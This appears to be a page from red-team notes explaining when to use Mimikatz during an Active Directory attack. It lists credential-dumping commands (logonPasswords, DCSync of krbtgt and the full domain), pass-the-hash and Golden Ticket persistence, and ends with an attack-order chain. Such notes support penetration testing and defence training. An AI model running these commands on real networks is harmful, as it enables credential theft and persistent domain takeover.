# Mimikatz — When & Why

Full syntax, flags, and where to get input values: [Mimikatz Tool Reference](../../tools/mimikatz.md)

---

## When You Use Mimikatz in an Attack

### You just got a shell as local admin on a workstation
Run `sekurlsa::logonPasswords` — if a domain user is logged in, you get their NTLM hash or cleartext password. That is your ticket into the rest of the domain.

### You got Domain Admin
Run `lsadump::dcsync /user:krbtgt` — pulls the krbtgt hash for Golden Ticket persistence. Also dump Administrator and any other high-value accounts.

### You need to move laterally without the password
`sekurlsa::pth` spawns a process as another user using their NTLM hash. No password needed.

### You want persistence after the engagement
Generate a Golden Ticket with the krbtgt hash. Even if they reset every user's password, your ticket still works until they reset krbtgt **twice**.

### You are on a DC or have DCSync rights
`lsadump::dcsync` — pulls hashes for any account without touching the NTDS.dit file directly. Quieter than secretsdump in some environments.

---

## Attack Order (Most Common Path)

```
Get local admin shell
    ↓
sekurlsa::logonPasswords        → grab domain user hash
    ↓
netexec smb spray with hash     → find more machines (Pwn3d!)
    ↓
secretsdump or nxc --sam        → more hashes
    ↓
reach Domain Admin
    ↓
lsadump::dcsync /user:krbtgt    → Golden Ticket material
lsadump::dcsync /all /csv       → full domain dump
```

---

## See Also
- [Golden Ticket](../domain-compromise/golden-ticket.md) — when to use a Golden Ticket
- [Dumping NTDS.dit](../domain-compromise/dumping-ntds.md) — alternative to DCSync
- [Rubeus](../../tools/rubeus.md) — for Diamond/Sapphire tickets and Kerberoasting
